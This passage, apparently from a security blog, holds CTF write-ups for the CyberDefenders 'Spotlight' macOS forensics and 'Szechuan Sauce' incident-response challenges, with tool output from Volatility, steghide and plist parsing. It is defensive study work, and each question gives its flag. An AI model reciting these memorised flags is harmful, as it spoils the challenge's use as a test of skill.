./mac_apt_artifact_only.exe -i RMAdminStore-Local.sqlite -o . SCREENTIME Output path was : . MAIN-INFO-Started macOS Artifact Parsing Tool - Artifact Only mode, version 1.5.8.dev (20230617) MAIN-INFO-Dates and times are in UTC unless the specific artifact being parsed saves it as local time! MAIN-INFO--------------------------------------------------- MAIN-INFO-Running plugin SCREENTIME MAIN-INFO--------------------------------------------------- MAIN.SCREENTIME-INFO-Module Started as standalone MAIN.SCREENTIME-INFO-Processing file RMAdminStore-Local.sqlite MAIN-INFO--------------------------------------------------- MAIN-INFO-Finished in time = 00:00:00 MAIN-INFO-Review the Log file and report any ERRORs or EXCEPTIONS to the developers 接下來就是設定filter就知道他在4/20有兩次的request :::spoiler Flag Flag: 20:58 :::\n==Q10== # What\u0026rsquo;s hansel.apricot\u0026rsquo;s password hint? (two words)\nRecon # 這一題是參考2\nPassword information can be found in the user plist, in private/db/dslocal/nodes/Default/users/(username).plist\nExploit # $ plistutil -i hansel.apricot.plist -o hansel.apricot.plist.txt $ vim hansel.apricot.plist.txt :::spoiler Flag Flag: Family Opinion :::\n==Q11== # The main file that stores Hansel\u0026rsquo;s iMessages had a few permissions changes. How many times did the permissions change?\nRecon # 直覺是承接第8題，看他的event log，而根據2的說明\nThe mail file storing iMessages in MacOS is chat.db\nExploit # :::spoiler Flag Flag: 7 :::\n==Q12== # What\u0026rsquo;s the UID of the user who is responsible for connecting mobile devices?\nRecon # 這一題是參考2，主要是找到位於root/private/var/db/dslocal/nodes/Default/users/的_usbmuxd.plist，這個file主要是:\nThe process responsible for connecting iPhones/iPads with MacOS is lockdown\n但就算不找到這個file，應該還是有其他file是可以擷取出UID的資訊\nExploit # :::spoiler Flag Flag: 213 :::\n==Q13== # Find the flag in the GoodExample.jpg image. It\u0026rsquo;s hidden with better tools.\nExploit # 這個直接用steghide隱藏起來，密碼為空，解出來的file內容如下\n$ steghide extract -sf GoodExample.jpg Enter passphrase: wrote extracted data to \u0026#34;steganopayload27635.txt\u0026#34;. $ cat steganopayload27635.txt Our latest phone will have flag\u0026lt;helicopter\u0026gt; blades and 6 cameras on it. No other phone has those features!% :::spoiler Flag Flag: helicopter :::\n==Q14== # What was exactly typed in the Spotlight search bar on 4/20/2020 02:09:48\nRecon # 因為本身不是mac使用者，所以不知道Spotlight功能具體功用為何 在 Mac 上使用 Spotlight 搜尋\nSpotlight 可協助你快速找到 Mac 上的 App、文件、電子郵件和其他項目\n感覺有點類似windows的cortona? 根據ChatGPT的說明，兩者有部分功能類似，不過Cortana比較像是智能助理的感覺，而spotlight只是能夠快速找到一些使用者像要找的file/app/email之類的個人資訊\nExploit # $ grep -r -i \u0026#39;2020-04-20\u0026#39; * grep: macOS Catalina - Data [volume_0]/root/private/var/log/powermanagement/2020.04.19.asl: binary file matches macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts: \u0026lt;date\u0026gt;2020-04-20T02:44:27Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts: \u0026lt;date\u0026gt;2020-04-20T02:09:48Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/com.apple.touristd/com.apple.touristd.plist: \u0026lt;date\u0026gt;2020-04-20T02:04:09Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/CrashReporter/Intervals_564D2904-54C9-8D99-F8CA-9D7111C46577.plist: \u0026lt;date\u0026gt;2020-04-20T02:04:08Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/CrashReporter/Intervals_564D2904-54C9-8D99-F8CA-9D7111C46577.plist: \u0026lt;date\u0026gt;2020-04-20T02:04:08Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/CrashReporter/Intervals_564D2904-54C9-8D99-F8CA-9D7111C46577.plist: \u0026lt;date\u0026gt;2020-04-20T02:04:08Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Application Support/CrashReporter/Intervals_564D2904-54C9-8D99-F8CA-9D7111C46577.plist: \u0026lt;date\u0026gt;2020-04-20T04:29:01Z\u0026lt;/date\u0026gt; macOS Catalina - Data [volume_0]/root/Users/sneaky/Library/Preferences/com.apple.security.KCN.plist: \u0026lt;date\u0026gt;2020-04-20T03:19:33Z\u0026lt;/date\u0026gt; 直接用grep search找到位於./root/Users/sneaky/Library/Application Support/com.apple.spotlight/的==com.apple.spotlight.Shortcuts==\n$ cat macOS\\ Catalina\\ -\\ Data\\ \\[volume_0\\]/root/Users/sneaky/Library/Application\\ Support/com.apple.spotlight/com.apple.spotlight.Shortcuts \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;silent\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;DISPLAY_NAME\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;silenteye-0.4.1b-snowleopard_installer\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;LAST_USED\u0026lt;/key\u0026gt; \u0026lt;date\u0026gt;2020-04-20T02:44:27Z\u0026lt;/date\u0026gt; \u0026lt;key\u0026gt;URL\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/Applications/silenteye-0.4.1b-snowleopard_installer.app\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;key\u0026gt;term\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;DISPLAY_NAME\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Terminal\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;LAST_USED\u0026lt;/key\u0026gt; \u0026lt;date\u0026gt;2020-04-20T02:09:48Z\u0026lt;/date\u0026gt; \u0026lt;key\u0026gt;URL\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/System/Applications/Utilities/Terminal.app\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 從結果來看，使用者在2020-04-20 02:44:27輸入過==silent==這個關鍵字，並且顯示silenteye-0.4.1b-snowleopard_installer這個strings，同樣的在2020-04-20 02:09:48時，使用者輸入了==term==這個關鍵字，並且系統回傳Terminal這個strings\n:::spoiler Flag Flag: term :::\n==Q15== # What is hansel.apricot\u0026rsquo;s Open Directory user UUID?\nRecon # 這一題還是參考2，主要是承接第10題的結果，可以在下面看到generateduid的strings :::spoiler Flag Flag: 5BB00259-4F58-4FDE-BC67-C2659BA0A5A4 :::\nReference # Spotlight Blue Team Challenge\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCyberDefenders: Spotlight\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":89,"href":"/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/","title":"CyberDefender - Szechuan Sauce (Part 1)","section":"Securities","content":" CyberDefender - Szechuan Sauce (Part 1) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/31 Part 2: https://hackmd.io/@SBK6401/HkAbt-NXT :::spoiler TOC [TOC] :::\nScenario # An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.\nThe helper\u0026rsquo;s demand for payment revealed that he was actually a threat actor. The company\u0026rsquo;s digital forensics team was called in to investigate and identify the attacker, determine the extent of the attack, and assess potential data breaches. The team must analyze the employee\u0026rsquo;s computer and communication logs to prevent similar attacks in the future.\nTools # volatility2 FTK Timeline Explorer Wireshark Registry Explorer 前提 # 這一題有分兩個裝置，一個是Desktop，另外一個是server，也分別對這兩個進行FTK packet和export memory，所以在分析的時候要特別注意，以下問題的順序會在這兩個裝置之間切換\n==Q1== # What’s the Operating System version of the Server? (two words)\nRecon # 這一題是針對server，所以可以直接用volatility對server memory進行分析，或者是直接用FTK對register進行稽核 起手式\n$ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win8SP0x64, Win81U1x64, Win2012R2x64_18340, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win8SP1x64 (Instantiated with Win8SP1x64) AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (D:\\NTU\\CTF\\CyberDefenders\\Szechuan Sauce\\citadeldc01.mem) PAE type : No PAE DTB : 0x1a7000L KDBG : 0xf800cba9ba20L Number of Processors : 2 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff800cbaea000L KPCR for CPU 1 : 0xffffd0019fd55000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2020-09-19 04:39:59 UTC+0000 Image local date and time : 2020-09-18 21:39:59 -0700 :::spoiler Flag Flag: 2012 R2 :::\n==Q2== # What’s the Operating System of the Desktop? (four words separated by spaces)\nRecon # 這一題可以參考Hunter - Part 1 - Q5，我可以直接把Software的registry export出來，然後用registry explorer查看/root/Microsoft/Windows NT/CurrentVersion就會知道==Desktop==的OS\nExploit # :::spoiler Flag Flag: Windows 10 Enterprise Evaluation :::\n==Q3== # What was the IP address assigned to the domain controller?\nRecon # 可以參考Hunter - Part 1 - Q2\nExploit # 就是察看Server的SYSTEM中，ControlSet001/Services/Tcpip/Parameters/Interfaces/ :::spoiler Flag Flag: 10.42.85.10 :::\n==Q4== # What was the timezone of the Server?\nRecon # 可以先參考Hunter Part 1 - Q6\nExploit # 這一題很迷，先查看Server的SYSTEM的ControlSet001/Control/TimeZoneInformation/的TimeZoneKeyName是Pacific Standard Time，代表不是UTC-8就是UTC-7，但這兩個都不是答案，隨便try了以後再看hint發現，原來是Admin設定錯時區，要發現這一件事情真的很難，看了1還是一知半解，不過我試著自己操作和解釋\n首先，根據hint的說明，可以知道domain controller的timezone和應該是和desktop不一樣所以才會有這樣的問題 這件事情可以從NTP(Network Time Protocol)看到，這主要是用於同步時間的protocol，所以從這些封包中可以看到他的時間是無法同步的，由此可知時間的timezone可能有問題 What is NTP?\n網路時間協定（英語：Network Time Protocol，縮寫：NTP）是在資料網路潛伏時間可變的電腦系統之間通過封包交換進行時鐘同步的一個網路協定，位於OSI模型的應用層。自1985年以來，NTP是目前仍在使用的最古老的網際網路協定之一。NTP由德拉瓦大學的David L. Mills設計。\n具體來說到底差多少呢?這個可以從Server的event log和封包的時間差換算，我的想法是先把sercurity event log 從server export出來，然後找到RDP的登入時間，再比對wireshark的封包比對相對的時間就可以知道正確差多少\nEvent Log在/root/Windows/System32/winevt/Logs/中，轉換成csv檔後再用timeline explorer打開 $ ./EvtxECmd.exe -f Security.evtx --csv output 找到一樣的封包和event紀錄 可以看到event log的時間是2020-09-19 03:21:48，而封包的時間是2020-09-19 02:21:47，兩者大約差了一個小時，因為當時的月份是9月也就是還在夏令時間，所以正確的時間應該是UTC-7，也就是說封包的時間是UTC-7的結果，而server上的3點是快了一小時的結果，所以應該是UTC-6就是server上設定的時間 :::spoiler Flag Flag: UTC-6 :::\n==Q5== # What was the initial entry vector (how did they get in)?. Provide protocol name.\nRecon # 從上一題就可以知道他是利用RDP連到domain controller\n:::spoiler Flag Flag: RDP :::\n==Q6== # What was the malicious process used by the malware? (one word)\nRecon # 這一題提到malware馬上就要想到\n他怎麼傳送過去到受害主機$\\to$wireshark$\\to$Export Object 如果他有跑起來，可不可以直接知道是哪一支檔案$\\to$memory analysis$\\to$volatility$\\to$pslist 如果可以dump出來就送到virustotal看 Exploit # 首先我先用volatility看他執行process的狀況 :::spoiler Result $ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem --profile Win2012R2x64 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0xffffe0005f273040 System 4 0 98 0 ------ 0 2020-09-19 01:22:38 UTC+0000 0xffffe00060354900 smss.exe 204 4 2 0 ------ 0 2020-09-19 01:22:38 UTC+0000 0xffffe000602c2080 csrss.exe 324 316 8 0 0 0 2020-09-19 01:22:39 UTC+0000 0xffffe000602cc900 wininit.exe 404 316 1 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe000602c1900 csrss.exe 412 396 10 0 1 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060c11080 services.exe 452 404 5 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060c0e080 lsass.exe 460 404 31 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060c2a080 winlogon.exe 492 396 4 0 1 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060c84900 svchost.exe 640 452 8 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060c9a700 svchost.exe 684 452 6 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060ca3900 svchost.exe 800 452 12 0 0 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060d09680 dwm.exe 808 492 7 0 1 0 2020-09-19 01:22:40 UTC+0000 0xffffe00060d1e080 svchost.exe 848 452 39 0 0 0 2020-09-19 01:22:41 UTC+0000 0xffffe00060d5d500 svchost.exe 928 452 16 0 0 0 2020-09-19 01:22:41 UTC+0000 0xffffe00060da2080 svchost.exe 1000 452 18 0 0 0 2020-09-19 01:22:41 UTC+0000 0xffffe00060e09900 svchost.exe 668 452 16 0 0 0 2020-09-19 01:22:41 UTC+0000 0xffffe00060f73900 Microsoft.Acti 1292 452 9 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00060fe1900 dfsrs.exe 1332 452 16 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00060ff3080 dns.exe 1368 452 16 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00060ff7900 ismserv.exe 1392 452 6 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe000614aa200 VGAuthService. 1556 452 2 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00061a30900 vmtoolsd.exe 1600 452 9 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00061a9a800 wlms.exe 1644 452 2 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe00061a9b2c0 dfssvc.exe 1660 452 11 0 0 0 2020-09-19 01:22:57 UTC+0000 0xffffe0006291b7c0 svchost.exe 1956 452 30 0 0 0 2020-09-19 01:23:20 UTC+0000 0xffffe000629b3080 vds.exe 796 452 11 0 0 0 2020-09-19 01:23:20 UTC+0000 0xffffe000629926c0 svchost.exe 1236 452 8 0 0 0 2020-09-19 01:23:21 UTC+0000 0xffffe000629de900 WmiPrvSE.exe 2056 640 11 0 0 0 2020-09-19 01:23:21 UTC+0000 0xffffe00062a26900 dllhost.exe 2216 452 10 0 0 0 2020-09-19 01:23:21 UTC+0000 0xffffe00062a2a900 msdtc.exe 2460 452 9 0 0 0 2020-09-19 01:23:21 UTC+0000 0xffffe000631cb900 spoolsv.exe 3724 452 13 0 0 0 2020-09-19 03:29:40 UTC+0000 0xffffe00062fe7700 coreupdater.ex 3644 2244 0 -------- 2 0 2020-09-19 03:56:37 UTC+0000 2020-09-19 03:56:52 UTC+0000 0xffffe00062f04900 taskhostex.exe 3796 848 7 0 1 0 2020-09-19 04:36:03 UTC+0000 0xffffe00063171900 explorer.exe 3472 3960 39 0 1 0 2020-09-19 04:36:03 UTC+0000 0xffffe00060ce2080 ServerManager. 400 1904 10 0 1 0 2020-09-19 04:36:03 UTC+0000 0xffffe00063299280 vm3dservice.ex 3260 3472 1 0 1 0 2020-09-19 04:36:14 UTC+0000 0xffffe00062ede1c0 vmtoolsd.exe 2608 3472 8 0 1 0 2020-09-19 04:36:14 UTC+0000 0xffffe00063021900 FTK Imager.exe 2840 3472 9 0 1 0 2020-09-19 04:37:04 UTC+0000 0xffffe0006313f900 WMIADAP.exe 3056 848 5 0 0 0 2020-09-19 04:37:42 UTC+0000 0xffffe00062c0a900 WmiPrvSE.exe 2764 640 6 0 0 0 2020-09-19 04:37:42 UTC+0000 ::: 當然有幾個我是有一點懷疑，例如WmiPrvSE.exe, WMIADAP.exe, spoolsv.exe等等，不過查了一下應該都是windows裡面內建的正常程序，不過也不能掉以輕心，可能是被駭客換過只是名字一樣，不過有一個process令人擔心，就是==coreupdater.exe==，因為查資料的時候無意間看到這個網站，裡面有提到詳細這支程式的攻擊手法和IP位置，因此感覺不是巧合，先dump出來再說 我是用volatility procdump，但是遇到一些問題導致dump不出來，可能是和paging有關係，導致PEB結構parse不出來 $ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem --profile Win2012R2x64 procdump -p 3644 --dump-dir=\u0026#34;Export Files/Server\u0026#34; Volatility Foundation Volatility Framework 2.6 Process(V) ImageBase Name Result ------------------ ------------------ -------------------- ------ 0xffffe00062fe7700 ------------------ coreupdater.ex Error: PEB at 0x7ff5ffffe000 is unavailable (possibly due to paging) 這邊有簡單說明甚麼是PEB [edu-ctf 2023] week06 - rev2 所以我們就要想有甚麼其他方法可以把這個file export出來，可以從他怎麼傳進server開始切入，如果從wireshark的export file可以dump出來 丟到virustotal果然很有問題 完整分析結果 :::spoiler Flag Flag: coreupdater :::\n==Q7== # Which process did malware migrate to after the initial compromise? (one word)\nRecon # 這一題的直覺是利用volatility的malfind看有沒有利用coreupdater去inject哪一些process\nExploit # 從結果可以看到有幾個process有問題: Process: Microsoft.Acti Pid: 1292 Address: 0x10500120000 Process: svchost.exe Pid: 1236 Address: 0x1b10ee0000 Process: spoolsv.exe Pid: 3724 Address: 0x4afbf20000 Process: explorer.exe Pid: 3472 Address: 0x5770000 Process: ServerManager. Pid: 400 Address: 0x5dc9ce0000\n:::spoiler Result\n$ ./volatility_2.6_win64_standalone.exe -f citadeldc01.mem --profile Win2012R2x64 malfind Volatility Foundation Volatility Framework 2.6 Process: Microsoft.Acti Pid: 1292 Address: 0x10500120000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x10500120000 00 00 00 00 00 00 00 00 b4 26 f3 1c 40 13 00 01 .........\u0026amp;..@... 0x10500120010 ee ff ee ff 02 00 00 00 20 01 12 00 05 01 00 00 ................ 0x10500120020 20 01 12 00 05 01 00 00 00 00 12 00 05 01 00 00 ................ 0x10500120030 00 00 12 00 05 01 00 00 0f 00 00 00 00 00 00 00 ................ 0x00120000 0000 ADD [EAX], AL 0x00120002 0000 ADD [EAX], AL 0x00120004 0000 ADD [EAX], AL 0x00120006 0000 ADD [EAX], AL 0x00120008 b426 MOV AH, 0x26 0x0012000a f31c40 SBB AL, 0x40 0x0012000d 1300 ADC EAX, [EAX] 0x0012000f 01ee ADD ESI, EBP 0x00120011 ff DB 0xff 0x00120012 ee OUT DX, AL 0x00120013 ff02 INC DWORD [EDX] 0x00120015 0000 ADD [EAX], AL 0x00120017 0020 ADD [EAX], AH 0x00120019 0112 ADD [EDX], EDX 0x0012001b 000501000020 ADD [0x20000001], AL 0x00120021 0112 ADD [EDX], EDX 0x00120023 000501000000 ADD [0x1], AL 0x00120029 0012 ADD [EDX], DL 0x0012002b 000501000000 ADD [0x1], AL 0x00120031 0012 ADD [EDX], DL 0x00120033 00050100000f ADD [0xf000001], AL 0x00120039 0000 ADD [EAX], AL 0x0012003b 0000 ADD [EAX], AL 0x0012003d 0000 ADD [EAX], AL 0x0012003f 00 DB 0x0 Process: Microsoft.Acti Pid: 1292 Address: 0x10500100000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x10500100000 00 00 00 00 00 00 00 00 08 00 10 00 05 01 00 00 ................ 0x10500100010 08 00 10 00 05 01 00 00 00 00 12 00 05 01 00 00 ................ 0x10500100020 20 0d 10 00 05 01 00 00 00 10 10 00 05 01 00 00 ................ 0x10500100030 00 d0 10 00 05 01 00 00 00 00 00 00 00 00 00 00 ................ 0x00100000 0000 ADD [EAX], AL 0x00100002 0000 ADD [EAX], AL 0x00100004 0000 ADD [EAX], AL 0x00100006 0000 ADD [EAX], AL 0x00100008 0800 OR [EAX], AL 0x0010000a 1000 ADC [EAX], AL 0x0010000c 0501000008 ADD EAX, 0x8000001 0x00100011 0010 ADD [EAX], DL 0x00100013 000501000000 ADD [0x1], AL 0x00100019 0012 ADD [EDX], DL 0x0010001b 000501000020 ADD [0x20000001], AL 0x00100021 0d10000501 OR EAX, 0x1050010 0x00100026 0000 ADD [EAX], AL 0x00100028 0010 ADD [EAX], DL 0x0010002a 1000 ADC [EAX], AL 0x0010002c 0501000000 ADD EAX, 0x1 0x00100031 d010 RCL BYTE [EAX], 0x1 0x00100033 000501000000 ADD [0x1], AL 0x00100039 0000 ADD [EAX], AL 0x0010003b 0000 ADD [EAX], AL 0x0010003d 0000 ADD [EAX], AL 0x0010003f 00 DB 0x0 Process: Microsoft.Acti Pid: 1292 Address: 0x105001f0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x105001f0000 00 00 00 00 00 00 00 00 5c 67 95 04 1e 40 00 01 ........\\g...@.. 0x105001f0010 ee ff ee ff 02 00 00 00 20 01 1f 00 05 01 00 00 ................ 0x105001f0020 20 01 1f 00 05 01 00 00 00 00 1f 00 05 01 00 00 ................ 0x105001f0030 00 00 1f 00 05 01 00 00 0f 00 00 00 00 00 00 00 ................ 0x001f0000 0000 ADD [EAX], AL 0x001f0002 0000 ADD [EAX], AL 0x001f0004 0000 ADD [EAX], AL 0x001f0006 0000 ADD [EAX], AL 0x001f0008 5c POP ESP 0x001f0009 6795 XCHG EBP, EAX 0x001f000b 041e ADD AL, 0x1e 0x001f000d 40 INC EAX 0x001f000e 0001 ADD [ECX], AL 0x001f0010 ee OUT DX, AL 0x001f0011 ff DB 0xff 0x001f0012 ee OUT DX, AL 0x001f0013 ff02 INC DWORD [EDX] 0x001f0015 0000 ADD [EAX], AL 0x001f0017 0020 ADD [EAX], AH 0x001f0019 011f ADD [EDI], EBX 0x001f001b 000501000020 ADD [0x20000001], AL 0x001f0021 011f ADD [EDI], EBX 0x001f0023 000501000000 ADD [0x1], AL 0x001f0029 001f ADD [EDI], BL 0x001f002b 000501000000 ADD [0x1], AL 0x001f0031 001f ADD [EDI], BL 0x001f0033 00050100000f ADD [0xf000001], AL 0x001f0039 0000 ADD [EAX], AL 0x001f003b 0000 ADD [EAX], AL 0x001f003d 0000 ADD [EAX], AL 0x001f003f 00 DB 0x0 Process: Microsoft.Acti Pid: 1292 Address: 0x7ff5ff8d0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x7ff5ff8d0000 00 00 00 00 00 00 00 00 78 0d 00 00 00 00 00 00 ........x....... 0x7ff5ff8d0010 0c 00 00 00 49 c7 c2 00 00 00 00 48 b8 f0 e4 4f ....I......H...O 0x7ff5ff8d0020 d6 ff 7f 00 00 ff e0 49 c7 c2 01 00 00 00 48 b8 .......I......H. 0x7ff5ff8d0030 f0 e4 4f d6 ff 7f 00 00 ff e0 49 c7 c2 02 00 00 ..O.......I..... 0xff8d0000 0000 ADD [EAX], AL 0xff8d0002 0000 ADD [EAX], AL 0xff8d0004 0000 ADD [EAX], AL 0xff8d0006 0000 ADD [EAX], AL 0xff8d0008 780d JS 0xff8d0017 0xff8d000a 0000 ADD [EAX], AL 0xff8d000c 0000 ADD [EAX], AL 0xff8d000e 0000 ADD [EAX], AL 0xff8d0010 0c00 OR AL, 0x0 0xff8d0012 0000 ADD [EAX], AL 0xff8d0014 49 DEC ECX 0xff8d0015 c7 DB 0xc7 0xff8d0016 c20000 RET 0x0 0xff8d0019 0000 ADD [EAX], AL 0xff8d001b 48 DEC EAX 0xff8d001c b8f0e44fd6 MOV EAX, 0xd64fe4f0 0xff8d0021 ff DB 0xff 0xff8d0022 7f00 JG 0xff8d0024 0xff8d0024 00ff ADD BH, BH 0xff8d0026 e049 LOOPNZ 0xff8d0071 0xff8d0028 c7 DB 0xc7 0xff8d0029 c20100 RET 0x1 0xff8d002c 0000 ADD [EAX], AL 0xff8d002e 48 DEC EAX 0xff8d002f b8f0e44fd6 MOV EAX, 0xd64fe4f0 0xff8d0034 ff DB 0xff 0xff8d0035 7f00 JG 0xff8d0037 0xff8d0037 00ff ADD BH, BH 0xff8d0039 e049 LOOPNZ 0xff8d0084 0xff8d003b c7 DB 0xc7 0xff8d003c c20200 RET 0x2 0xff8d003f 00 DB 0x0 Process: Microsoft.Acti Pid: 1292 Address: 0x7ff5ff8e0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x7ff5ff8e0000 d8 ff ff ff ff ff ff ff 08 00 00 00 00 00 00 00 ................ 0x7ff5ff8e0010 01 00 00 00 00 00 00 00 00 02 0e 03 38 00 00 00 ............8... 0x7ff5ff8e0020 68 41 95 09 0c 00 00 00 b8 11 49 d5 ff 7f 00 00 hA........I..... 0x7ff5ff8e0030 00 10 e2 d4 ff 7f 00 00 f0 e0 ec d4 ff 7f 00 00 ................ 0xff8e0000 d8ff FDIVR ST0, ST7 0xff8e0002 ff DB 0xff 0xff8e0003 ff DB 0xff 0xff8e0004 ff DB 0xff 0xff8e0005 ff DB 0xff 0xff8e0006 ff DB 0xff 0xff8e0007 ff08 DEC DWORD [EAX] 0xff8e0009 0000 ADD [EAX], AL 0xff8e000b 0000 ADD [EAX], AL 0xff8e000d 0000 ADD [EAX], AL 0xff8e000f 0001 ADD [ECX], AL 0xff8e0011 0000 ADD [EAX], AL 0xff8e0013 0000 ADD [EAX], AL 0xff8e0015 0000 ADD [EAX], AL 0xff8e0017 0000 ADD [EAX], AL 0xff8e0019 020e ADD CL, [ESI] 0xff8e001b 0338 ADD EDI, [EAX] 0xff8e001d 0000 ADD [EAX], AL 0xff8e001f 006841 ADD [EAX+0x41], CH 0xff8e0022 95 XCHG EBP, EAX 0xff8e0023 090c00 OR [EAX+EAX], ECX 0xff8e0026 0000 ADD [EAX], AL 0xff8e0028 b81149d5ff MOV EAX, 0xffd54911 0xff8e002d 7f00 JG 0xff8e002f 0xff8e002f 0000 ADD [EAX], AL 0xff8e0031 10e2 ADC DL, AH 0xff8e0033 d4ff AAM 0xff 0xff8e0035 7f00 JG 0xff8e0037 0xff8e0037 00f0 ADD AL, DH 0xff8e0039 e0ec LOOPNZ 0xff8e0027 0xff8e003b d4ff AAM 0xff 0xff8e003d 7f00 JG 0xff8e003f 0xff8e003f 00 DB 0x0 Process: svchost.exe Pid: 1236 Address: 0x1b10ee0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x1b10ee0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x1b10ee0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x1b10ee0020 00 00 ee 10 1b 00 00 00 00 00 00 00 00 00 00 00 ................ 0x1b10ee0030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x10ee0000 0000 ADD [EAX], AL 0x10ee0002 0000 ADD [EAX], AL 0x10ee0004 0000 ADD [EAX], AL 0x10ee0006 0000 ADD [EAX], AL 0x10ee0008 0000 ADD [EAX], AL 0x10ee000a 0000 ADD [EAX], AL 0x10ee000c 0000 ADD [EAX], AL 0x10ee000e 0000 ADD [EAX], AL 0x10ee0010 0000 ADD [EAX], AL 0x10ee0012 0000 ADD [EAX], AL 0x10ee0014 0000 ADD [EAX], AL 0x10ee0016 0000 ADD [EAX], AL 0x10ee0018 0000 ADD [EAX], AL 0x10ee001a 0000 ADD [EAX], AL 0x10ee001c 0000 ADD [EAX], AL 0x10ee001e 0000 ADD [EAX], AL 0x10ee0020 0000 ADD [EAX], AL 0x10ee0022 ee OUT DX, AL 0x10ee0023 101b ADC [EBX], BL 0x10ee0025 0000 ADD [EAX], AL 0x10ee0027 0000 ADD [EAX], AL 0x10ee0029 0000 ADD [EAX], AL 0x10ee002b 0000 ADD [EAX], AL 0x10ee002d 0000 ADD [EAX], AL 0x10ee002f 0000 ADD [EAX], AL 0x10ee0031 0000 ADD [EAX], AL 0x10ee0033 0000 ADD [EAX], AL 0x10ee0035 0000 ADD [EAX], AL 0x10ee0037 0000 ADD [EAX], AL 0x10ee0039 0000 ADD [EAX], AL 